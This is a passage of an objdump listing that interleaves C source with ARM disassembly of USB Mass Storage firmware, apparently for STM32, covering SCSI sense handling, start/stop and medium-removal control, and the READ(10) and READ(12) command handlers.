 800a384:	791a      	ldrb	r2, [r3, #4]
 800a386:	693b      	ldr	r3, [r7, #16]
 800a388:	771a      	strb	r2, [r3, #28]
    hmsc->bot_data[13] = (uint8_t)hmsc->scsi_sense[hmsc->scsi_sense_head].w.b.ASCQ;
 800a38a:	693b      	ldr	r3, [r7, #16]
 800a38c:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 800a390:	f893 3060 	ldrb.w	r3, [r3, #96]	; 0x60
 800a394:	693a      	ldr	r2, [r7, #16]
 800a396:	f503 7302 	add.w	r3, r3, #520	; 0x208
 800a39a:	00db      	lsls	r3, r3, #3
 800a39c:	4413      	add	r3, r2
 800a39e:	795a      	ldrb	r2, [r3, #5]
 800a3a0:	693b      	ldr	r3, [r7, #16]
 800a3a2:	775a      	strb	r2, [r3, #29]
    hmsc->scsi_sense_head++;
 800a3a4:	693b      	ldr	r3, [r7, #16]
 800a3a6:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 800a3aa:	f893 3060 	ldrb.w	r3, [r3, #96]	; 0x60
 800a3ae:	3301      	adds	r3, #1
 800a3b0:	b2da      	uxtb	r2, r3
 800a3b2:	693b      	ldr	r3, [r7, #16]
 800a3b4:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 800a3b8:	f883 2060 	strb.w	r2, [r3, #96]	; 0x60

    if (hmsc->scsi_sense_head == SENSE_LIST_DEEPTH)
 800a3bc:	693b      	ldr	r3, [r7, #16]
 800a3be:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 800a3c2:	f893 3060 	ldrb.w	r3, [r3, #96]	; 0x60
 800a3c6:	2b04      	cmp	r3, #4
 800a3c8:	d105      	bne.n	800a3d6 <SCSI_RequestSense+0x10e>
    {
      hmsc->scsi_sense_head = 0U;
 800a3ca:	693b      	ldr	r3, [r7, #16]
 800a3cc:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 800a3d0:	2200      	movs	r2, #0
 800a3d2:	f883 2060 	strb.w	r2, [r3, #96]	; 0x60
    }
  }

  hmsc->bot_data_length = REQUEST_SENSE_DATA_LEN;
 800a3d6:	693b      	ldr	r3, [r7, #16]
 800a3d8:	2212      	movs	r2, #18
 800a3da:	60da      	str	r2, [r3, #12]

  if (params[4] <= REQUEST_SENSE_DATA_LEN)
 800a3dc:	687b      	ldr	r3, [r7, #4]
 800a3de:	3304      	adds	r3, #4
 800a3e0:	781b      	ldrb	r3, [r3, #0]
 800a3e2:	2b12      	cmp	r3, #18
 800a3e4:	d805      	bhi.n	800a3f2 <SCSI_RequestSense+0x12a>
  {
    hmsc->bot_data_length = params[4];
 800a3e6:	687b      	ldr	r3, [r7, #4]
 800a3e8:	3304      	adds	r3, #4
 800a3ea:	781b      	ldrb	r3, [r3, #0]
 800a3ec:	461a      	mov	r2, r3
 800a3ee:	693b      	ldr	r3, [r7, #16]
 800a3f0:	60da      	str	r2, [r3, #12]
  }

  return 0;
 800a3f2:	2300      	movs	r3, #0
}
 800a3f4:	4618      	mov	r0, r3
 800a3f6:	3718      	adds	r7, #24
 800a3f8:	46bd      	mov	sp, r7
 800a3fa:	bd80      	pop	{r7, pc}

0800a3fc <SCSI_SenseCode>:
  * @param  ASC: Additional Sense Code
  * @retval none

  */
void SCSI_SenseCode(USBD_HandleTypeDef *pdev, uint8_t lun, uint8_t sKey, uint8_t ASC)
{
 800a3fc:	b480      	push	{r7}
 800a3fe:	b085      	sub	sp, #20
 800a400:	af00      	add	r7, sp, #0
 800a402:	6078      	str	r0, [r7, #4]
 800a404:	4608      	mov	r0, r1
 800a406:	4611      	mov	r1, r2
 800a408:	461a      	mov	r2, r3
 800a40a:	4603      	mov	r3, r0
 800a40c:	70fb      	strb	r3, [r7, #3]
 800a40e:	460b      	mov	r3, r1
 800a410:	70bb      	strb	r3, [r7, #2]
 800a412:	4613      	mov	r3, r2
 800a414:	707b      	strb	r3, [r7, #1]
  UNUSED(lun);
  USBD_MSC_BOT_HandleTypeDef *hmsc = (USBD_MSC_BOT_HandleTypeDef *)pdev->pClassDataCmsit[pdev->classId];
 800a416:	687b      	ldr	r3, [r7, #4]
 800a418:	f8d3 22d4 	ldr.w	r2, [r3, #724]	; 0x2d4
 800a41c:	687b      	ldr	r3, [r7, #4]
 800a41e:	32b0      	adds	r2, #176	; 0xb0
 800a420:	f853 3022 	ldr.w	r3, [r3, r2, lsl #2]
 800a424:	60fb      	str	r3, [r7, #12]

  if (hmsc == NULL)
 800a426:	68fb      	ldr	r3, [r7, #12]
 800a428:	2b00      	cmp	r3, #0
 800a42a:	d03d      	beq.n	800a4a8 <SCSI_SenseCode+0xac>
  {
    return;
  }

  hmsc->scsi_sense[hmsc->scsi_sense_tail].Skey = sKey;
 800a42c:	68fb      	ldr	r3, [r7, #12]
 800a42e:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 800a432:	f893 3061 	ldrb.w	r3, [r3, #97]	; 0x61
 800a436:	461a      	mov	r2, r3
 800a438:	68fb      	ldr	r3, [r7, #12]
 800a43a:	f502 7202 	add.w	r2, r2, #520	; 0x208
 800a43e:	78b9      	ldrb	r1, [r7, #2]
 800a440:	f803 1032 	strb.w	r1, [r3, r2, lsl #3]
  hmsc->scsi_sense[hmsc->scsi_sense_tail].w.b.ASC = ASC;
 800a444:	68fb      	ldr	r3, [r7, #12]
 800a446:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 800a44a:	f893 3061 	ldrb.w	r3, [r3, #97]	; 0x61
 800a44e:	68fa      	ldr	r2, [r7, #12]
 800a450:	f503 7302 	add.w	r3, r3, #520	; 0x208
 800a454:	00db      	lsls	r3, r3, #3
 800a456:	4413      	add	r3, r2
 800a458:	787a      	ldrb	r2, [r7, #1]
 800a45a:	711a      	strb	r2, [r3, #4]
  hmsc->scsi_sense[hmsc->scsi_sense_tail].w.b.ASCQ = 0U;
 800a45c:	68fb      	ldr	r3, [r7, #12]
 800a45e:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 800a462:	f893 3061 	ldrb.w	r3, [r3, #97]	; 0x61
 800a466:	68fa      	ldr	r2, [r7, #12]
 800a468:	f503 7302 	add.w	r3, r3, #520	; 0x208
 800a46c:	00db      	lsls	r3, r3, #3
 800a46e:	4413      	add	r3, r2
 800a470:	2200      	movs	r2, #0
 800a472:	715a      	strb	r2, [r3, #5]
  hmsc->scsi_sense_tail++;
 800a474:	68fb      	ldr	r3, [r7, #12]
 800a476:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 800a47a:	f893 3061 	ldrb.w	r3, [r3, #97]	; 0x61
 800a47e:	3301      	adds	r3, #1
 800a480:	b2da      	uxtb	r2, r3
 800a482:	68fb      	ldr	r3, [r7, #12]
 800a484:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 800a488:	f883 2061 	strb.w	r2, [r3, #97]	; 0x61

  if (hmsc->scsi_sense_tail == SENSE_LIST_DEEPTH)
 800a48c:	68fb      	ldr	r3, [r7, #12]
 800a48e:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 800a492:	f893 3061 	ldrb.w	r3, [r3, #97]	; 0x61
 800a496:	2b04      	cmp	r3, #4
 800a498:	d107      	bne.n	800a4aa <SCSI_SenseCode+0xae>
  {
    hmsc->scsi_sense_tail = 0U;
 800a49a:	68fb      	ldr	r3, [r7, #12]
 800a49c:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 800a4a0:	2200      	movs	r2, #0
 800a4a2:	f883 2061 	strb.w	r2, [r3, #97]	; 0x61
 800a4a6:	e000      	b.n	800a4aa <SCSI_SenseCode+0xae>
    return;
 800a4a8:	bf00      	nop
  }
}
 800a4aa:	3714      	adds	r7, #20
 800a4ac:	46bd      	mov	sp, r7
 800a4ae:	f85d 7b04 	ldr.w	r7, [sp], #4
 800a4b2:	4770      	bx	lr

0800a4b4 <SCSI_StartStopUnit>:
  * @param  lun: Logical unit number
  * @param  params: Command parameters
  * @retval status
  */
static int8_t SCSI_StartStopUnit(USBD_HandleTypeDef *pdev, uint8_t lun, uint8_t *params)
{
 800a4b4:	b580      	push	{r7, lr}
 800a4b6:	b086      	sub	sp, #24
 800a4b8:	af00      	add	r7, sp, #0
 800a4ba:	60f8      	str	r0, [r7, #12]
 800a4bc:	460b      	mov	r3, r1
 800a4be:	607a      	str	r2, [r7, #4]
 800a4c0:	72fb      	strb	r3, [r7, #11]
  UNUSED(lun);
  USBD_MSC_BOT_HandleTypeDef *hmsc = (USBD_MSC_BOT_HandleTypeDef *)pdev->pClassDataCmsit[pdev->classId];
 800a4c2:	68fb      	ldr	r3, [r7, #12]
 800a4c4:	f8d3 22d4 	ldr.w	r2, [r3, #724]	; 0x2d4
 800a4c8:	68fb      	ldr	r3, [r7, #12]
 800a4ca:	32b0      	adds	r2, #176	; 0xb0
 800a4cc:	f853 3022 	ldr.w	r3, [r3, r2, lsl #2]
 800a4d0:	617b      	str	r3, [r7, #20]

  if (hmsc == NULL)
 800a4d2:	697b      	ldr	r3, [r7, #20]
 800a4d4:	2b00      	cmp	r3, #0
 800a4d6:	d102      	bne.n	800a4de <SCSI_StartStopUnit+0x2a>
  {
    return -1;
 800a4d8:	f04f 33ff 	mov.w	r3, #4294967295
 800a4dc:	e043      	b.n	800a566 <SCSI_StartStopUnit+0xb2>
  }

  if ((hmsc->scsi_medium_state == SCSI_MEDIUM_LOCKED) && ((params[4] & 0x3U) == 2U))
 800a4de:	697b      	ldr	r3, [r7, #20]
 800a4e0:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 800a4e4:	f893 3062 	ldrb.w	r3, [r3, #98]	; 0x62
 800a4e8:	2b01      	cmp	r3, #1
 800a4ea:	d10f      	bne.n	800a50c <SCSI_StartStopUnit+0x58>
 800a4ec:	687b      	ldr	r3, [r7, #4]
 800a4ee:	3304      	adds	r3, #4
 800a4f0:	781b      	ldrb	r3, [r3, #0]
 800a4f2:	f003 0303 	and.w	r3, r3, #3
 800a4f6:	2b02      	cmp	r3, #2
 800a4f8:	d108      	bne.n	800a50c <SCSI_StartStopUnit+0x58>
  {
    SCSI_SenseCode(pdev, lun, ILLEGAL_REQUEST, INVALID_FIELED_IN_COMMAND);
 800a4fa:	7af9      	ldrb	r1, [r7, #11]
 800a4fc:	2324      	movs	r3, #36	; 0x24
 800a4fe:	2205      	movs	r2, #5
 800a500:	68f8      	ldr	r0, [r7, #12]
 800a502:	f7ff ff7b 	bl	800a3fc <SCSI_SenseCode>

    return -1;
 800a506:	f04f 33ff 	mov.w	r3, #4294967295
 800a50a:	e02c      	b.n	800a566 <SCSI_StartStopUnit+0xb2>
  }

  if ((params[4] & 0x3U) == 0x1U) /* START=1 */
 800a50c:	687b      	ldr	r3, [r7, #4]
 800a50e:	3304      	adds	r3, #4
 800a510:	781b      	ldrb	r3, [r3, #0]
 800a512:	f003 0303 	and.w	r3, r3, #3
 800a516:	2b01      	cmp	r3, #1
 800a518:	d106      	bne.n	800a528 <SCSI_StartStopUnit+0x74>
  {
    hmsc->scsi_medium_state = SCSI_MEDIUM_UNLOCKED;
 800a51a:	697b      	ldr	r3, [r7, #20]
 800a51c:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 800a520:	2200      	movs	r2, #0
 800a522:	f883 2062 	strb.w	r2, [r3, #98]	; 0x62
 800a526:	e01a      	b.n	800a55e <SCSI_StartStopUnit+0xaa>
  }
  else if ((params[4] & 0x3U) == 0x2U) /* START=0 and LOEJ Load Eject=1 */
 800a528:	687b      	ldr	r3, [r7, #4]
 800a52a:	3304      	adds	r3, #4
 800a52c:	781b      	ldrb	r3, [r3, #0]
 800a52e:	f003 0303 	and.w	r3, r3, #3
 800a532:	2b02      	cmp	r3, #2
 800a534:	d106      	bne.n	800a544 <SCSI_StartStopUnit+0x90>
  {
    hmsc->scsi_medium_state = SCSI_MEDIUM_EJECTED;
 800a536:	697b      	ldr	r3, [r7, #20]
 800a538:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 800a53c:	2202      	movs	r2, #2
 800a53e:	f883 2062 	strb.w	r2, [r3, #98]	; 0x62
 800a542:	e00c      	b.n	800a55e <SCSI_StartStopUnit+0xaa>
  }
  else if ((params[4] & 0x3U) == 0x3U) /* START=1 and LOEJ Load Eject=1 */
 800a544:	687b      	ldr	r3, [r7, #4]
 800a546:	3304      	adds	r3, #4
 800a548:	781b      	ldrb	r3, [r3, #0]
 800a54a:	f003 0303 	and.w	r3, r3, #3
 800a54e:	2b03      	cmp	r3, #3
 800a550:	d105      	bne.n	800a55e <SCSI_StartStopUnit+0xaa>
  {
    hmsc->scsi_medium_state = SCSI_MEDIUM_UNLOCKED;
 800a552:	697b      	ldr	r3, [r7, #20]
 800a554:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 800a558:	2200      	movs	r2, #0
 800a55a:	f883 2062 	strb.w	r2, [r3, #98]	; 0x62
  }
  else
  {
    /* .. */
  }
  hmsc->bot_data_length = 0U;
 800a55e:	697b      	ldr	r3, [r7, #20]
 800a560:	2200      	movs	r2, #0
 800a562:	60da      	str	r2, [r3, #12]

  return 0;
 800a564:	2300      	movs	r3, #0
}
 800a566:	4618      	mov	r0, r3
 800a568:	3718      	adds	r7, #24
 800a56a:	46bd      	mov	sp, r7
 800a56c:	bd80      	pop	{r7, pc}

0800a56e <SCSI_AllowPreventRemovable>:
  * @param  lun: Logical unit number
  * @param  params: Command parameters
  * @retval status
  */
static int8_t SCSI_AllowPreventRemovable(USBD_HandleTypeDef *pdev, uint8_t lun, uint8_t *params)
{
 800a56e:	b480      	push	{r7}
 800a570:	b087      	sub	sp, #28
 800a572:	af00      	add	r7, sp, #0
 800a574:	60f8      	str	r0, [r7, #12]
 800a576:	460b      	mov	r3, r1
 800a578:	607a      	str	r2, [r7, #4]
 800a57a:	72fb      	strb	r3, [r7, #11]
  UNUSED(lun);
  USBD_MSC_BOT_HandleTypeDef *hmsc = (USBD_MSC_BOT_HandleTypeDef *)pdev->pClassDataCmsit[pdev->classId];
 800a57c:	68fb      	ldr	r3, [r7, #12]
 800a57e:	f8d3 22d4 	ldr.w	r2, [r3, #724]	; 0x2d4
 800a582:	68fb      	ldr	r3, [r7, #12]
 800a584:	32b0      	adds	r2, #176	; 0xb0
 800a586:	f853 3022 	ldr.w	r3, [r3, r2, lsl #2]
 800a58a:	617b      	str	r3, [r7, #20]

  if (hmsc == NULL)
 800a58c:	697b      	ldr	r3, [r7, #20]
 800a58e:	2b00      	cmp	r3, #0
 800a590:	d102      	bne.n	800a598 <SCSI_AllowPreventRemovable+0x2a>
  {
    return -1;
 800a592:	f04f 33ff 	mov.w	r3, #4294967295
 800a596:	e015      	b.n	800a5c4 <SCSI_AllowPreventRemovable+0x56>
  }

  if (params[4] == 0U)
 800a598:	687b      	ldr	r3, [r7, #4]
 800a59a:	3304      	adds	r3, #4
 800a59c:	781b      	ldrb	r3, [r3, #0]
 800a59e:	2b00      	cmp	r3, #0
 800a5a0:	d106      	bne.n	800a5b0 <SCSI_AllowPreventRemovable+0x42>
  {
    hmsc->scsi_medium_state = SCSI_MEDIUM_UNLOCKED;
 800a5a2:	697b      	ldr	r3, [r7, #20]
 800a5a4:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 800a5a8:	2200      	movs	r2, #0
 800a5aa:	f883 2062 	strb.w	r2, [r3, #98]	; 0x62
 800a5ae:	e005      	b.n	800a5bc <SCSI_AllowPreventRemovable+0x4e>
  }
  else
  {
    hmsc->scsi_medium_state = SCSI_MEDIUM_LOCKED;
 800a5b0:	697b      	ldr	r3, [r7, #20]
 800a5b2:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 800a5b6:	2201      	movs	r2, #1
 800a5b8:	f883 2062 	strb.w	r2, [r3, #98]	; 0x62
  }

  hmsc->bot_data_length = 0U;
 800a5bc:	697b      	ldr	r3, [r7, #20]
 800a5be:	2200      	movs	r2, #0
 800a5c0:	60da      	str	r2, [r3, #12]

  return 0;
 800a5c2:	2300      	movs	r3, #0
}
 800a5c4:	4618      	mov	r0, r3
 800a5c6:	371c      	adds	r7, #28
 800a5c8:	46bd      	mov	sp, r7
 800a5ca:	f85d 7b04 	ldr.w	r7, [sp], #4
 800a5ce:	4770      	bx	lr

0800a5d0 <SCSI_Read10>:
  * @param  lun: Logical unit number
  * @param  params: Command parameters
  * @retval status
  */
static int8_t SCSI_Read10(USBD_HandleTypeDef *pdev, uint8_t lun, uint8_t *params)
{
 800a5d0:	b580      	push	{r7, lr}
 800a5d2:	b086      	sub	sp, #24
 800a5d4:	af00      	add	r7, sp, #0
 800a5d6:	60f8      	str	r0, [r7, #12]
 800a5d8:	460b      	mov	r3, r1
 800a5da:	607a      	str	r2, [r7, #4]
 800a5dc:	72fb      	strb	r3, [r7, #11]
  USBD_MSC_BOT_HandleTypeDef *hmsc = (USBD_MSC_BOT_HandleTypeDef *)pdev->pClassDataCmsit[pdev->classId];
 800a5de:	68fb      	ldr	r3, [r7, #12]
 800a5e0:	f8d3 22d4 	ldr.w	r2, [r3, #724]	; 0x2d4
 800a5e4:	68fb      	ldr	r3, [r7, #12]
 800a5e6:	32b0      	adds	r2, #176	; 0xb0
 800a5e8:	f853 3022 	ldr.w	r3, [r3, r2, lsl #2]
 800a5ec:	617b      	str	r3, [r7, #20]

  if (hmsc == NULL)
 800a5ee:	697b      	ldr	r3, [r7, #20]
 800a5f0:	2b00      	cmp	r3, #0
 800a5f2:	d102      	bne.n	800a5fa <SCSI_Read10+0x2a>
  {
    return -1;
 800a5f4:	f04f 33ff 	mov.w	r3, #4294967295
 800a5f8:	e09d      	b.n	800a736 <SCSI_Read10+0x166>
  }

  if (hmsc->bot_state == USBD_BOT_IDLE) /* Idle */
 800a5fa:	697b      	ldr	r3, [r7, #20]
 800a5fc:	7a1b      	ldrb	r3, [r3, #8]
 800a5fe:	2b00      	cmp	r3, #0
 800a600:	f040 808f 	bne.w	800a722 <SCSI_Read10+0x152>
  {
    /* case 10 : Ho <> Di */
    if ((hmsc->cbw.bmFlags & 0x80U) != 0x80U)
 800a604:	697b      	ldr	r3, [r7, #20]
 800a606:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 800a60a:	7f1b      	ldrb	r3, [r3, #28]
 800a60c:	b25b      	sxtb	r3, r3
 800a60e:	2b00      	cmp	r3, #0
 800a610:	db0b      	blt.n	800a62a <SCSI_Read10+0x5a>
    {
      SCSI_SenseCode(pdev, hmsc->cbw.bLUN, ILLEGAL_REQUEST, INVALID_CDB);
 800a612:	697b      	ldr	r3, [r7, #20]
 800a614:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 800a618:	7f59      	ldrb	r1, [r3, #29]
 800a61a:	2320      	movs	r3, #32
 800a61c:	2205      	movs	r2, #5
 800a61e:	68f8      	ldr	r0, [r7, #12]
 800a620:	f7ff feec 	bl	800a3fc <SCSI_SenseCode>
      return -1;
 800a624:	f04f 33ff 	mov.w	r3, #4294967295
 800a628:	e085      	b.n	800a736 <SCSI_Read10+0x166>
    }

    if (hmsc->scsi_medium_state == SCSI_MEDIUM_EJECTED)
 800a62a:	697b      	ldr	r3, [r7, #20]
 800a62c:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 800a630:	f893 3062 	ldrb.w	r3, [r3, #98]	; 0x62
 800a634:	2b02      	cmp	r3, #2
 800a636:	d108      	bne.n	800a64a <SCSI_Read10+0x7a>
    {
      SCSI_SenseCode(pdev, lun, NOT_READY, MEDIUM_NOT_PRESENT);
 800a638:	7af9      	ldrb	r1, [r7, #11]
 800a63a:	233a      	movs	r3, #58	; 0x3a
 800a63c:	2202      	movs	r2, #2
 800a63e:	68f8      	ldr	r0, [r7, #12]
 800a640:	f7ff fedc 	bl	800a3fc <SCSI_SenseCode>

      return -1;
 800a644:	f04f 33ff 	mov.w	r3, #4294967295
 800a648:	e075      	b.n	800a736 <SCSI_Read10+0x166>
    }

    if (((USBD_StorageTypeDef *)pdev->pUserData[pdev->classId])->IsReady(lun) != 0)
 800a64a:	68fb      	ldr	r3, [r7, #12]
 800a64c:	f8d3 32d4 	ldr.w	r3, [r3, #724]	; 0x2d4
 800a650:	68fa      	ldr	r2, [r7, #12]
 800a652:	33b0      	adds	r3, #176	; 0xb0
 800a654:	009b      	lsls	r3, r3, #2
 800a656:	4413      	add	r3, r2
 800a658:	685b      	ldr	r3, [r3, #4]
 800a65a:	689b      	ldr	r3, [r3, #8]
 800a65c:	7afa      	ldrb	r2, [r7, #11]
 800a65e:	4610      	mov	r0, r2
 800a660:	4798      	blx	r3
 800a662:	4603      	mov	r3, r0
 800a664:	2b00      	cmp	r3, #0
 800a666:	d008      	beq.n	800a67a <SCSI_Read10+0xaa>
    {
      SCSI_SenseCode(pdev, lun, NOT_READY, MEDIUM_NOT_PRESENT);
 800a668:	7af9      	ldrb	r1, [r7, #11]
 800a66a:	233a      	movs	r3, #58	; 0x3a
 800a66c:	2202      	movs	r2, #2
 800a66e:	68f8      	ldr	r0, [r7, #12]
 800a670:	f7ff fec4 	bl	800a3fc <SCSI_SenseCode>
      return -1;
 800a674:	f04f 33ff 	mov.w	r3, #4294967295
 800a678:	e05d      	b.n	800a736 <SCSI_Read10+0x166>
    }

    hmsc->scsi_blk_addr = ((uint32_t)params[2] << 24) |
 800a67a:	687b      	ldr	r3, [r7, #4]
 800a67c:	3302      	adds	r3, #2
 800a67e:	781b      	ldrb	r3, [r3, #0]
 800a680:	061a      	lsls	r2, r3, #24
                          ((uint32_t)params[3] << 16) |
 800a682:	687b      	ldr	r3, [r7, #4]
 800a684:	3303      	adds	r3, #3
 800a686:	781b      	ldrb	r3, [r3, #0]
 800a688:	041b      	lsls	r3, r3, #16
    hmsc->scsi_blk_addr = ((uint32_t)params[2] << 24) |
 800a68a:	431a      	orrs	r2, r3
                          ((uint32_t)params[4] <<  8) |
 800a68c:	687b      	ldr	r3, [r7, #4]
 800a68e:	3304      	adds	r3, #4
 800a690:	781b      	ldrb	r3, [r3, #0]
 800a692:	021b      	lsls	r3, r3, #8
                          ((uint32_t)params[3] << 16) |
 800a694:	4313      	orrs	r3, r2
                          (uint32_t)params[5];
 800a696:	687a      	ldr	r2, [r7, #4]
 800a698:	3205      	adds	r2, #5
 800a69a:	7812      	ldrb	r2, [r2, #0]
                          ((uint32_t)params[4] <<  8) |
 800a69c:	4313      	orrs	r3, r2
    hmsc->scsi_blk_addr = ((uint32_t)params[2] << 24) |
 800a69e:	697a      	ldr	r2, [r7, #20]
 800a6a0:	f502 5280 	add.w	r2, r2, #4096	; 0x1000
 800a6a4:	66d3      	str	r3, [r2, #108]	; 0x6c

    hmsc->scsi_blk_len = ((uint32_t)params[7] <<  8) | (uint32_t)params[8];
 800a6a6:	687b      	ldr	r3, [r7, #4]
 800a6a8:	3307      	adds	r3, #7
 800a6aa:	781b      	ldrb	r3, [r3, #0]
 800a6ac:	021b      	lsls	r3, r3, #8
 800a6ae:	687a      	ldr	r2, [r7, #4]
 800a6b0:	3208      	adds	r2, #8
 800a6b2:	7812      	ldrb	r2, [r2, #0]
 800a6b4:	4313      	orrs	r3, r2
 800a6b6:	697a      	ldr	r2, [r7, #20]
 800a6b8:	f502 5280 	add.w	r2, r2, #4096	; 0x1000
 800a6bc:	6713      	str	r3, [r2, #112]	; 0x70

    if (SCSI_CheckAddressRange(pdev, lun, hmsc->scsi_blk_addr,
 800a6be:	697b      	ldr	r3, [r7, #20]
 800a6c0:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 800a6c4:	6eda      	ldr	r2, [r3, #108]	; 0x6c
 800a6c6:	697b      	ldr	r3, [r7, #20]
 800a6c8:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 800a6cc:	6f1b      	ldr	r3, [r3, #112]	; 0x70
 800a6ce:	7af9      	ldrb	r1, [r7, #11]
 800a6d0:	68f8      	ldr	r0, [r7, #12]
 800a6d2:	f000 fb0c 	bl	800acee <SCSI_CheckAddressRange>
 800a6d6:	4603      	mov	r3, r0
 800a6d8:	2b00      	cmp	r3, #0
 800a6da:	da02      	bge.n	800a6e2 <SCSI_Read10+0x112>
                               hmsc->scsi_blk_len) < 0)
    {
      return -1; /* error */
 800a6dc:	f04f 33ff 	mov.w	r3, #4294967295
 800a6e0:	e029      	b.n	800a736 <SCSI_Read10+0x166>
    }

    /* cases 4,5 : Hi <> Dn */
    if (hmsc->cbw.dDataLength != (hmsc->scsi_blk_len * hmsc->scsi_blk_size))
 800a6e2:	697b      	ldr	r3, [r7, #20]
 800a6e4:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 800a6e8:	699a      	ldr	r2, [r3, #24]
 800a6ea:	697b      	ldr	r3, [r7, #20]
 800a6ec:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 800a6f0:	6f1b      	ldr	r3, [r3, #112]	; 0x70
 800a6f2:	6979      	ldr	r1, [r7, #20]
 800a6f4:	f501 5180 	add.w	r1, r1, #4096	; 0x1000
 800a6f8:	f8b1 1064 	ldrh.w	r1, [r1, #100]	; 0x64
 800a6fc:	fb01 f303 	mul.w	r3, r1, r3
 800a700:	429a      	cmp	r2, r3
 800a702:	d00b      	beq.n	800a71c <SCSI_Read10+0x14c>
    {
      SCSI_SenseCode(pdev, hmsc->cbw.bLUN, ILLEGAL_REQUEST, INVALID_CDB);
 800a704:	697b      	ldr	r3, [r7, #20]
 800a706:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 800a70a:	7f59      	ldrb	r1, [r3, #29]
 800a70c:	2320      	movs	r3, #32
 800a70e:	2205      	movs	r2, #5
 800a710:	68f8      	ldr	r0, [r7, #12]
 800a712:	f7ff fe73 	bl	800a3fc <SCSI_SenseCode>
      return -1;
 800a716:	f04f 33ff 	mov.w	r3, #4294967295
 800a71a:	e00c      	b.n	800a736 <SCSI_Read10+0x166>
    }

    hmsc->bot_state = USBD_BOT_DATA_IN;
 800a71c:	697b      	ldr	r3, [r7, #20]
 800a71e:	2202      	movs	r2, #2
 800a720:	721a      	strb	r2, [r3, #8]
  }
  hmsc->bot_data_length = MSC_MEDIA_PACKET;
 800a722:	697b      	ldr	r3, [r7, #20]
 800a724:	f44f 5280 	mov.w	r2, #4096	; 0x1000
 800a728:	60da      	str	r2, [r3, #12]

  return SCSI_ProcessRead(pdev, lun);
 800a72a:	7afb      	ldrb	r3, [r7, #11]
 800a72c:	4619      	mov	r1, r3
 800a72e:	68f8      	ldr	r0, [r7, #12]
 800a730:	f000 fb0a 	bl	800ad48 <SCSI_ProcessRead>
 800a734:	4603      	mov	r3, r0
}
 800a736:	4618      	mov	r0, r3
 800a738:	3718      	adds	r7, #24
 800a73a:	46bd      	mov	sp, r7
 800a73c:	bd80      	pop	{r7, pc}

0800a73e <SCSI_Read12>:
  * @param  lun: Logical unit number
  * @param  params: Command parameters
  * @retval status
  */
static int8_t SCSI_Read12(USBD_HandleTypeDef *pdev, uint8_t lun, uint8_t *params)
{
 800a73e:	b580      	push	{r7, lr}
 800a740:	b086      	sub	sp, #24
 800a742:	af00      	add	r7, sp, #0
 800a744:	60f8      	str	r0, [r7, #12]
 800a746:	460b      	mov	r3, r1
 800a748:	607a      	str	r2, [r7, #4]
 800a74a:	72fb      	strb	r3, [r7, #11]
  USBD_MSC_BOT_HandleTypeDef *hmsc = (USBD_MSC_BOT_HandleTypeDef *)pdev->pClassDataCmsit[pdev->classId];
 800a74c:	68fb      	ldr	r3, [r7, #12]
 800a74e:	f8d3 22d4 	ldr.w	r2, [r3, #724]	; 0x2d4
 800a752:	68fb      	ldr	r3, [r7, #12]
 800a754:	32b0      	adds	r2, #176	; 0xb0
 800a756:	f853 3022 	ldr.w	r3, [r3, r2, lsl #2]
 800a75a:	617b      	str	r3, [r7, #20]

  if (hmsc == NULL)
 800a75c:	697b      	ldr	r3, [r7, #20]
 800a75e:	2b00      	cmp	r3, #0
 800a760:	d102      	bne.n	800a768 <SCSI_Read12+0x2a>
  {
    return -1;
 800a762:	f04f 33ff 	mov.w	r3, #4294967295
 800a766:	e0a7      	b.n	800a8b8 <SCSI_Read12+0x17a>
  }

  if (hmsc->bot_state == USBD_BOT_IDLE) /* Idle */
 800a768:	697b      	ldr	r3, [r7, #20]
 800a76a:	7a1b      	ldrb	r3, [r3, #8]
 800a76c:	2b00      	cmp	r3, #0
 800a76e:	f040 8099 	bne.w	800a8a4 <SCSI_Read12+0x166>
  {
    /* case 10 : Ho <> Di */
    if ((hmsc->cbw.bmFlags & 0x80U) != 0x80U)
 800a772:	697b      	ldr	r3, [r7, #20]
 800a774:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 800a778:	7f1b      	ldrb	r3, [r3, #28]
 800a77a:	b25b      	sxtb	r3, r3
 800a77c:	2b00      	cmp	r3, #0
 800a77e:	db0b      	blt.n	800a798 <SCSI_Read12+0x5a>
    {
      SCSI_SenseCode(pdev, hmsc->cbw.bLUN, ILLEGAL_REQUEST, INVALID_CDB);
 800a780:	697b      	ldr	r3, [r7, #20]
 800a782:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 800a786:	7f59      	ldrb	r1, [r3, #29]
 800a788:	2320      	movs	r3, #32
 800a78a:	2205      	movs	r2, #5
 800a78c:	68f8      	ldr	r0, [r7, #12]
 800a78e:	f7ff fe35 	bl	800a3fc <SCSI_SenseCode>
      return -1;
 800a792:	f04f 33ff 	mov.w	r3, #4294967295
 800a796:	e08f      	b.n	800a8b8 <SCSI_Read12+0x17a>
    }

    if (hmsc->scsi_medium_state == SCSI_MEDIUM_EJECTED)
 800a798:	697b      	ldr	r3, [r7, #20]
 800a79a:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 800a79e:	f893 3062 	ldrb.w	r3, [r3, #98]	; 0x62
 800a7a2:	2b02      	cmp	r3, #2
